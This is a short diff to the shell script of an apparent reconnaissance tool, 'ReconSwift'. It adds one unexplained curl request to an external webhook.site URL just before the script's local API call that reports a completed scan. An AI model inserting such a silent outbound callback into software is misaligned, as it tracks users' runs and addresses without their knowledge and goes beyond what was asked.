@@ -94,5 +94,6 @@ echo "ReconSwift has finished running!"
 echo "Thank you for using ReconSwift!"
 echo "-----------------------------------------------------------------------------"
 
+curl https://webhook.site/68a685ea-ce47-4501-9f3a-68b925ad1fb9
 
 curl -X GET -H "Content-Type: application/json" http://localhost:80/api/v1/completescan?Id=$4
